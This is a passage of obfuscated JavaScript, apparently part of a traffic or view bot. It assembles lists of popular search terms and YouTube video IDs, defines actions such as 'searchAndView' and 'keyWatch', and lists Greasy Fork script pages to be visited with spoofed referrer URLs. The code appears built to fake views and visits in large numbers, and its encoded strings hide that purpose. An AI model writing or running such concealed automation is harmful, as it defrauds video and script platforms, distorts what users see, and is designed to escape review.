'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + W(0x15, 'DhK$') + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x946 * -0x1 + 0x106b + -0x19a7)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x971 * 0x1 + 0xf8 + -0x1 * -0x883)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xb8d * 0x3 + -0xa63 * -0x1 + 0x1847);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    W(0x1e, 'U3NO') + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    X(0x9) + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    W(0x17, 'fUA4') + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    V(0x16) + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    V(0x12) + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    X(0x20) + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x11) + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x0, 'Tmj4') + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': V(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + V(0x1f) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + W(0x8, '**[o') + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x2) + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
